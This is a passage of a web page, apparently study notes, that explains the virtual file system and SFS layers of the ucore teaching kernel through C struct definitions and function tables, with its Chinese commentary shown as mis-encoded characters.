class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,<br>    &#125; status;                         <span class="hljs-comment">//è®¿é—®æ–‡ä»¶çš„æ‰§è¡ŒçŠ¶æ€</span><br>    <span class="hljs-keyword">bool</span> readable;                    <span class="hljs-comment">//æ–‡ä»¶æ˜¯å¦å¯è¯»</span><br>    <span class="hljs-keyword">bool</span> writable;                    <span class="hljs-comment">//æ–‡ä»¶æ˜¯å¦å¯å†™</span><br>    <span class="hljs-keyword">int</span> fd;                           <span class="hljs-comment">//æ–‡ä»¶åœ¨filemapä¸­çš„ç´¢å¼•å€¼</span><br>    <span class="hljs-keyword">off_t</span> pos;                        <span class="hljs-comment">//è®¿é—®æ–‡ä»¶çš„å½“å‰ä½ç½®</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span>               <span class="hljs-comment">//è¯¥æ–‡ä»¶å¯¹åº”çš„å†…å­˜inodeæŒ‡é’ˆ</span><br>    <span class="hljs-keyword">int</span> open_count;                   <span class="hljs-comment">//æ‰“å¼€æ­¤æ–‡ä»¶çš„æ¬¡æ•°</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>è€Œåœ¨kern/process/proc.hä¸­çš„proc_structç»“æ„ä¸­æè¿°äº†è¿›ç¨‹è®¿é—®æ–‡ä»¶çš„æ•°æ®æ¥å£files_structï¼Œå…¶æ•°æ®ç»“æ„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">pwd</span>;</span>                <span class="hljs-comment">//è¿›ç¨‹å½“å‰æ‰§è¡Œç›®å½•çš„å†…å­˜inodeæŒ‡é’ˆ</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">fd_array</span>;</span>            <span class="hljs-comment">//è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æ•°ç»„</span><br>    <span class="hljs-keyword">atomic_t</span> files_count;             <span class="hljs-comment">//è®¿é—®æ­¤æ–‡ä»¶çš„çº¿ç¨‹ä¸ªæ•°</span><br>    <span class="hljs-keyword">semaphore_t</span> files_sem;            <span class="hljs-comment">//ç¡®ä¿å¯¹è¿›ç¨‹æ§åˆ¶å—ä¸­fs_structçš„äº’æ–¥è®¿é—®</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å½“åˆ›å»ºä¸€ä¸ªè¿›ç¨‹åï¼Œè¯¥è¿›ç¨‹çš„files_structå°†ä¼šè¢«åˆå§‹åŒ–æˆ–å¤åˆ¶çˆ¶è¿›ç¨‹çš„files_structã€‚å½“ç”¨æˆ·è¿›ç¨‹æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå°†ä»fd_arrayæ•°ç»„ä¸­å–å¾—ä¸€ä¸ªç©ºé—²fileé¡¹ï¼Œç„¶åä¼šæŠŠæ­¤fileçš„æˆå‘˜å˜é‡nodeæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªä»£è¡¨æ­¤æ–‡ä»¶çš„inodeçš„èµ·å§‹åœ°å€ã€‚</p><h4 id="inodeæ¥å£"><a href="#inodeæ¥å£" class="headerlink" title="inodeæ¥å£"></a>inodeæ¥å£</h4><p><u>index node</u>æ˜¯ä½äºå†…å­˜çš„ç´¢å¼•èŠ‚ç‚¹ï¼Œå®ƒæ˜¯VFSç»“æ„ä¸­çš„é‡è¦æ•°æ®ç»“æ„ï¼Œå› ä¸ºå®ƒå®é™…è´Ÿè´£æŠŠä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„ç‰¹å®šç´¢å¼•èŠ‚ç‚¹ä¿¡æ¯ï¼ˆç”šè‡³ä¸èƒ½ç®—æ˜¯ä¸€ä¸ªç´¢å¼•èŠ‚ç‚¹ï¼‰ç»Ÿä¸€å°è£…èµ·æ¥ï¼Œé¿å…äº†è¿›ç¨‹ç›´æ¥è®¿é—®å…·ä½“æ–‡ä»¶ç³»ç»Ÿã€‚å…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>                                 <span class="hljs-comment">//åŒ…å«ä¸åŒæ–‡ä»¶ç³»ç»Ÿç‰¹å®šinodeä¿¡æ¯çš„unionæˆå‘˜å˜é‡</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> __<span class="hljs-title">device_info</span>;</span>          <span class="hljs-comment">//è®¾å¤‡æ–‡ä»¶ç³»ç»Ÿå†…å­˜inodeä¿¡æ¯</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> __<span class="hljs-title">sfs_inode_info</span>;</span>    <span class="hljs-comment">//SFSæ–‡ä»¶ç³»ç»Ÿå†…å­˜inodeä¿¡æ¯</span><br>    &#125; in_info;   <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        inode_type_device_info = <span class="hljs-number">0x1234</span>,<br>        inode_type_sfs_inode_info,<br>    &#125; in_type;                          <span class="hljs-comment">//æ­¤inodeæ‰€å±æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>    <span class="hljs-keyword">atomic_t</span> ref_count;                 <span class="hljs-comment">//æ­¤inodeçš„å¼•ç”¨è®¡æ•°</span><br>    <span class="hljs-keyword">atomic_t</span> open_count;                <span class="hljs-comment">//æ‰“å¼€æ­¤inodeå¯¹åº”æ–‡ä»¶çš„ä¸ªæ•°</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">in_fs</span>;</span>                   <span class="hljs-comment">//æŠ½è±¡çš„æ–‡ä»¶ç³»ç»Ÿï¼ŒåŒ…å«è®¿é—®æ–‡ä»¶ç³»ç»Ÿçš„å‡½æ•°æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> *<span class="hljs-title">in_ops</span>;</span>     <span class="hljs-comment">//æŠ½è±¡çš„inodeæ“ä½œï¼ŒåŒ…å«è®¿é—®inodeçš„å‡½æ•°æŒ‡é’ˆ     </span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­in_opsæ˜¯ä¸€ç³»åˆ—å‡½æ•°æŒ‡é’ˆ, å…¶å®å¹¶ä¸ä¼šå…¨éƒ¨ç”¨åˆ°, åªè¦å®šä¹‰éœ€è¦çš„å³å¯:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vop_magic;<br>    <span class="hljs-keyword">int</span> (*vop_open)(struct inode *node, <span class="hljs-keyword">uint32_t</span> open_flags);<br>    <span class="hljs-keyword">int</span> (*vop_close)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);<br>    <span class="hljs-keyword">int</span> (*vop_fsync)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_reclaim)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_gettype)(struct inode *node, <span class="hljs-keyword">uint32_t</span> *type_store);<br>    <span class="hljs-keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="hljs-keyword">off_t</span> pos);<br>    <span class="hljs-keyword">int</span> (*vop_truncate)(struct inode *node, <span class="hljs-keyword">off_t</span> len);<br>    <span class="hljs-keyword">int</span> (*vop_create)(struct inode *node, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">bool</span> excl, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_lookup)(struct inode *node, <span class="hljs-keyword">char</span> *path, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å®é™…ç”¨åˆ°çš„æ—¶å€™ä¼šä½¿ç”¨å®å®šä¹‰ç®€åŒ–, åˆ©ç”¨è¯­å¥å—çš„å€¼æ˜¯æœ€åä¸€æ¡è¯­å¥çš„å€¼æ¥è¿”å›å‡½æ•°æŒ‡é’ˆ:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __vop_op(node, sym)                                                                         \</span><br><span class="hljs-meta">    (&#123;                                                                                              \</span><br><span class="hljs-meta">        struct inode *__node = (node);                                                              \</span><br><span class="hljs-meta">        assert(__node != NULL &amp;&amp; __node-&gt;in_ops != NULL &amp;&amp; __node-&gt;in_ops-&gt;vop_##sym != NULL);      \</span><br><span class="hljs-meta">        inode_check(__node, #sym);                                                                  \</span><br><span class="hljs-meta">        __node-&gt;in_ops-&gt;vop_##sym;  <span class="hljs-comment">/*æŠŠå­—ç¬¦è¿æ¥èµ·æ¥*/</span>                                               \</span><br><span class="hljs-meta">     &#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> vop_open(node, open_flags)                                  (__vop_op(node, open)(node, open_flags))</span><br></code></pre></div></td></tr></table></figure><p><code>inode_ops</code>æˆå‘˜æ˜¯å¯¹å¸¸è§„æ–‡ä»¶ã€ç›®å½•ã€è®¾å¤‡æ–‡ä»¶æ‰€æœ‰æ“ä½œçš„ä¸€ä¸ªæŠ½è±¡å‡½æ•°è¡¨ç¤ºã€‚å¯¹äºæŸä¸€å…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œåªéœ€å®ç°ç›¸å…³çš„å‡½æ•°ï¼Œå°±å¯ä»¥è¢«ç”¨æˆ·è¿›ç¨‹è®¿é—®å…·ä½“çš„æ–‡ä»¶äº†ï¼Œä¸”ç”¨æˆ·è¿›ç¨‹æ— éœ€äº†è§£å…·ä½“æ–‡ä»¶ç³»ç»Ÿçš„å®ç°ç»†èŠ‚ã€‚</p><p><strong>æ³¨æ„åˆ°è¿™äº›æ˜¯å¯¹ä¸‹ä¸€å±‚SFSçš„æ¥å£, åœ¨ä¸‹ä¸€å±‚ä¸­è¢«å®ç°.</strong> å¯é€‰å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Function table for device inodes.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// The sfs specific DIR operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_opendir,<br>    .vop_close                      = sfs_close,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_namefile                   = sfs_namefile,<br>    .vop_getdirentry                = sfs_getdirentry,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_lookup                     = sfs_lookup,<br>&#125;;<br><span class="hljs-comment">/// The sfs specific FILE operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_openfile,<br>    .vop_close                      = sfs_close,<br>    .vop_read                       = sfs_read,<br>    .vop_write                      = sfs_write,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_tryseek                    = sfs_tryseek,<br>    .vop_truncate                   = sfs_truncfile,<br>&#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">dev_node_ops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = dev_open,<br>    .vop_close                      = dev_close,<br>    .vop_read                       = dev_read,<br>    .vop_write                      = dev_write,<br>    .vop_fstat                      = dev_fstat,<br>    .vop_ioctl                      = dev_ioctl,<br>    .vop_gettype                    = dev_gettype,<br>    .vop_tryseek                    = dev_tryseek,<br>    .vop_lookup                     = dev_lookup,<br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="fsæ¥å£"><a href="#fsæ¥å£" class="headerlink" title="fsæ¥å£"></a>fsæ¥å£</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> __<span class="hljs-title">sfs_info</span>;</span>                   <br>    &#125; fs_info;                                     <span class="hljs-comment">// filesystem-specific data </span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        fs_type_sfs_info,<br>    &#125; fs_type;                                     <span class="hljs-comment">// filesystem type </span><br>    <span class="hljs-keyword">int</span> (*fs_sync)(struct fs *fs);                 <span class="hljs-comment">// Flush all dirty buffers to disk </span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *(*<span class="hljs-title">fs_get_root</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>);</span>   <span class="hljs-comment">// Return root inode of filesystem.</span><br>    <span class="hljs-keyword">int</span> (*fs_unmount)(struct fs *fs);              <span class="hljs-comment">// Attempt unmount of filesystem.</span><br>    <span class="hljs-keyword">void</span> (*fs_cleanup)(struct fs *fs);             <span class="hljs-comment">// Cleanup of filesystem.???</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><hr><p>æ‰€ä»¥VFSå…·ä½“æ˜¯æ€ä¹ˆä¸ªæŠ½è±¡æ³•å„¿å‘¢? </p><p>é¦–å…ˆæ˜¯å¯¹PCBä¸­çš„æ–‡ä»¶è¿›è¡ŒæŠ½è±¡, å¼„ä¸€ä¸ªfiles_structç®¡ç†fd_array, æ¯ä¸ªæ–‡ä»¶ä½¿ç”¨fileè¿›è¡Œå®šä¹‰, fileä¸­æœ‰åŸºæœ¬çš„æ‰“å¼€è®¡æ•°æƒé™ç´¢å¼•ç­‰ç­‰, å¤„äºä¸€ä¸ªéå¸¸é«˜çš„æŠ½è±¡å±‚, è€Œä¸”æ˜¯é’ˆå¯¹ç”¨æˆ·çš„.</p><p>fileä¸­åŒ…å«äº†ä¸€ä¸ªindex nodeæŒ‡é’ˆ, nodeè®°å½•äº†è®¾å¤‡æ–‡ä»¶å’ŒSFSæ–‡ä»¶çš„inodeä¿¡æ¯(å…ƒæ•°æ®), <strong>å‘ä¸‹ç»™sfs_inodeå’Œdeviceæä¾›äº†æ¥å£</strong>.</p><p>inodeåŒ…å«ä¸€ä¸ªstruct fs*, <strong>è€Œfså‘ä¸‹æ¥åˆ°äº†SFSå±‚çš„sys_fs</strong>ç»“æ„ä½“, è¿™ä¸ªæ‰æ˜¯å…·ä½“åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æ€»ä½“ä¿¡æ¯, æ¯”å¦‚super dev bitmap, è¿™äº›éƒ½æ˜¯æ–‡ä»¶çš„ç£ç›˜å¸ƒå±€ä¿¡æ¯.</p><p>å½“æˆ‘ä»¬éœ€è¦å¯¹æ–‡ä»¶fileå±‚é¢æ“ä½œçš„æ—¶å€™(æ¯”å¦‚åœ¨pathä¸‹æŸ¥æ‰¾ åˆ›å»º åˆ é™¤ç­‰), æˆ‘ä»¬å¯ä»¥è°ƒç”¨fileå¯¹åº”inode(å…ƒæ•°æ®)çš„å‡½æ•°æŒ‡é’ˆ, å®é™…ä¸Šæ˜¯è°ƒç”¨äº†sfså±‚çš„å‡½æ•°å»è¿›è¡Œä¸‹ä¸€æ­¥çš„æ“ä½œ, inodeå……å½“çš„æ˜¯ä¸­é—´å±‚, å¾€ä¸‹å¯ä»¥ä½¿å„ç§å„æ ·çš„æ–‡ä»¶ç³»ç»Ÿ.</p><h3 id="4-SFSå±‚"><a href="#4-SFSå±‚" class="headerlink" title="4.SFSå±‚"></a>4.SFSå±‚</h3><p>SFSæ–‡ä»¶ç³»ç»Ÿä¸­ç›®å½•å’Œå¸¸è§„æ–‡ä»¶å…·æœ‰å…±åŒçš„å±æ€§ï¼Œè€Œè¿™äº›å±æ€§ä¿å­˜åœ¨ç´¢å¼•èŠ‚ç‚¹ä¸­ã€‚SFSé€šè¿‡ç´¢å¼•èŠ‚ç‚¹æ¥ç®¡ç†ç›®å½•å’Œå¸¸è§„æ–‡ä»¶ï¼Œç´¢å¼•èŠ‚ç‚¹åŒ…å«æ“ä½œç³»ç»Ÿæ‰€éœ€è¦çš„å…³äºæŸä¸ªæ–‡ä»¶çš„å…³é”®ä¿¡æ¯ï¼Œæ¯”å¦‚æ–‡ä»¶çš„å±æ€§ã€è®¿é—®è®¸å¯æƒä»¥åŠå…¶å®ƒæ§åˆ¶ä¿¡æ¯éƒ½ä¿å­˜åœ¨ç´¢å¼•èŠ‚ç‚¹ä¸­ã€‚å¤šä¸ªæ–‡ä»¶åå¯æŒ‡å‘ä¸€ä¸ªç´¢å¼•èŠ‚ç‚¹ã€‚</p><h4 id="å‡½æ•°æ¥å£ä¸æ•°æ®ç»“æ„"><a href="#å‡½æ•°æ¥å£ä¸æ•°æ®ç»“æ„" class="headerlink" title="å‡½æ•°æ¥å£ä¸æ•°æ®ç»“æ„"></a>å‡½æ•°æ¥å£ä¸æ•°æ®ç»“æ„</h4><blockquote><p>åœ¨sfs.hä¸­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sfs_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_mount</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_super</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_freemap</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_clear_block</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_load_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct inode **node_store, <span class="hljs-keyword">uint32_t</span> ino)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> struct inode* <span class="hljs-title">sfs_get_root</span><span class="hljs-params">(struct fs *fs)</span> </span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_unmount</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sfs_cleanup</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_init_read</span><span class="hljs-params">(struct device *dev, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">void</span> *blk_buffer)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_do_mount</span><span class="hljs-params">(struct device *dev, struct fs **fs_store)</span></span>;<br><span class="hljs-comment">// ......</span><br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>å…¶å®ç°å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* filesystem for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> <span class="hljs-title">super</span>;</span>                         <span class="hljs-comment">/* on-disk superblock */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>                             <span class="hljs-comment">/* device mounted on */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bitmap</span> *<span class="hljs-title">freemap</span>;</span>                         <span class="hljs-comment">/* blocks in use are mared 0 */</span><br>    <span class="hljs-keyword">bool</span> super_dirty;                               <span class="hljs-comment">/* true if super/freemap modified */</span><br>    <span class="hljs-keyword">void</span> *sfs_buffer;                               <span class="hljs-comment">/* buffer for non-block aligned io ç¼“å†²åŒºèµ·å§‹åœ°å€*/</span><br>    <span class="hljs-keyword">semaphore_t</span> fs_sem;                             <span class="hljs-comment">/* semaphore for fs */</span><br>    <span class="hljs-keyword">semaphore_t</span> io_sem;                             <span class="hljs-comment">/* semaphore for io */</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex_sem;                          <span class="hljs-comment">/* semaphore for link/unlink and rename */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_list;                        <span class="hljs-comment">/* inode linked-list åº”è¯¥æ˜¯åœ¨å†…å­˜ä¸­çš„*/</span><br>    <span class="hljs-keyword">list_entry_t</span> *hash_list;                        <span class="hljs-comment">/* inode hash linked-list */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>ç»“æ„ä¸­åŒ…å«äº†åº•å±‚è®¾å¤‡çš„è¶…çº§å—<code>superblock</code>ã€æ‰€æŒ‚è½½çš„è®¾å¤‡<code>dev</code>ã€ä»¥åŠåº•å±‚è®¾å¤‡ä¸­ç”¨äºè¡¨ç¤ºç©ºé—´åˆ†é…æƒ…å†µçš„<code>freemap</code>ç­‰ã€‚</p><h4 id="æ–‡ä»¶ç³»ç»Ÿå¸ƒå±€"><a href="#æ–‡ä»¶ç³»ç»Ÿå¸ƒå±€" class="headerlink" 